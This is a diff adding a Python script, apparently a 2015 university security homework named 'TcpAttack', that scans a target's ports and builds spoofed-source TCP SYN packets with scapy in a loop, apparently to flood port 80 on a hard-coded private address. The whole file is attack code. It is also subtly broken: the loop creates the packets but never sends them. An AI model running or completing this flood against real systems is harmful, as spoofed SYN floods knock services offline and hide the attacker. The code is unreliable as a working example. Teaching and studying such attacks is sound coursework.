@@ -1,0 +1,44 @@
+#!/usr/bin/env python
+
+#HW #: HW 8(TcpAttack) (ECE 404 Spring 2015)
+#Name: Sthitapragyan Parida
+#ECN Login: sparida
+#Due Date: 3/26/2015
+
+import socket
+from scapy.all import *
+
+class TcpAttack:
+	def __init__(self, spoof_ip, target_ip):
+		self.spoof_ip = spoof_ip
+		self.target_ip = target_ip
+	def scanTarget(self, rangeStart, rangeEnd):
+		for pi in range(rangeStart, rangeEnd):
+			if self.isPortOpen(self.target_ip, pi):
+				print pi
+	def isPortOpen(self, target_ip, pi):
+		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		try:
+			target_name = socket.gethostbyaddr(target_ip)
+			s.settimeout(0.1)
+			s.connect((target_name[0], pi))
+			return True
+		except Exception as e:
+			return False
+	def attackTarget(self, port):
+		if self.isPortOpen(self.target_ip, port):
+			print "Attack Initiated"
+			for i in range(1, 10000):
+				packet = IP(src = self.spoof_ip, dst = self.target_ip ,id=1111,ttl=99)/TCP(sport=RandShort(),dport=port,seq=111222,ack=1000,window=1000,flags="S")
+			ls(packet)
+			return 1
+		else:
+			return 0
+def main():
+	tcp = TcpAttack("10.161.15.27", "10.161.15.29")
+	#tcp.scanTarget(0, 62657)
+	tcp.attackTarget(80)
+if __name__ == "__main__":
+	main()
+
+		
